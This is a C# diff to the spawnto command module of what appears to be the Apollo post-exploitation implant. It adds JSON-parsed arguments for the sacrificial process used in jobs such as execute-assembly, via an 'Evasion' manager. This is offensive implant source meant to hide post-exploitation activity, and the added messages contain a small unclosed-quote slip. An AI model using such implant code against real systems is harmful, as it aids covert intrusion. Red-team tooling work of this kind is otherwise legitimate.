@@ -21,11 +21,19 @@ using static Native.Enums;
 using System.Runtime.InteropServices;
 using Apollo.Tasks;
 using Apollo.Evasion;
+using Newtonsoft.Json;
 
 namespace Apollo.CommandModules
 {
     class SpawnTo
     {
+
+        public struct SpawnToArgs
+        {
+            public string application;
+            public string arguments;
+        }
+
         /// <summary>
         /// Change the sacrificial process that's spawned for certain post-exploitation jobs
         /// such as execute assembly. Valid taskings are spawnto_x64 and spawnto_x86. If the
@@ -34,10 +42,15 @@ namespace Apollo.CommandModules
         /// </summary>
         /// <param name="job">Job associated with this task. The filepath is specified by job.Task.parameters.</param>
         /// <param name="agent">Agent this task is run on.</param>
+        /// 
         public static void Execute(Job job, Agent agent)
         {
             Task task = job.Task;
-            string path = task.parameters;
+            SpawnToArgs args = JsonConvert.DeserializeObject<SpawnToArgs>(job.Task.parameters);
+
+            string path = args.application;
+            string arguments = args.arguments;
+
             if (!File.Exists(path))
             {
                 job.SetError($"File {path} does not exist.");
@@ -50,9 +63,12 @@ namespace Apollo.CommandModules
                 case "spawnto_x64":
                     try
                     {
-                        if (EvasionManager.SetSpawnTo64(fileInfo.FullName))
+                        if (EvasionManager.SetSpawnTo64(fileInfo.FullName, arguments))
                         {
-                            job.SetComplete($"Changed spawnto_x64 to {fileInfo.FullName}");
+                            if (!string.IsNullOrEmpty(arguments))
+                                job.SetComplete($"Changed spawnto_x64 to '{fileInfo.FullName} {arguments}'");
+                            else
+                                job.SetComplete($"Changed spawnto_x64 to '{fileInfo.FullName} {arguments}");
                         } else
                         {
                             job.SetError($"Could not set spawnto_x64 {fileInfo.FullName} as it is not a valid executable.");
@@ -67,9 +83,12 @@ namespace Apollo.CommandModules
                 case "spawnto_x86":
                     try
                     {
-                        if (EvasionManager.SetSpawnTo86(fileInfo.FullName))
+                        if (EvasionManager.SetSpawnTo86(fileInfo.FullName, arguments))
                         {
-                            job.SetComplete($"Changed spawnto_x86 to {fileInfo.FullName}");
+                            if (!string.IsNullOrEmpty(arguments))
+                                job.SetComplete($"Changed spawnto_x86 to '{fileInfo.FullName} {arguments}'");
+                            else
+                                job.SetComplete($"Changed spawnto_x86 to '{fileInfo.FullName} {arguments}");
                         }
                         else
                         {
